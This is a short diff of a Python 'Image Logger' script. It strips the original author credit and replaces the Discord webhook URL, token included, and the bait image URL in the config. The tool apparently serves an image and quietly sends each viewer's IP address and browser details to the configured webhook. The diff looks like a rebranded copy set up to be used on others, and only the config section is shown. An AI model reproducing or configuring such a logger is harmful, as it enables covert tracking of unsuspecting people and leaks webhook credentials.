@@ -1,6 +1,3 @@
-# Image Logger
-# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -12,8 +9,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1482620513263030413/8PKmMSl94Ii998ENkOhXYx0hq9UT0ipUJBd3P7FU9iU6QobZYs8KHLVUzIYSOOU8tdVA",
-    "image": "https://t4.ftcdn.net/jpg/02/48/96/11/360_F_248961156_XeSISXFo6bcFUw830wpE2zPLxWGCl1u9.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1522461767392034816/jWv8tSfvGbIQPJrEWuPhRXtioM_BBfRvs_jtZXvRUilnSqrZ3ZpyBqmCE8nAp5BvNsYg",
+    "image": "https://i.pinimg.com/736x/b5/05/86/b505863be741b7af88d5bf0db53ada53.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
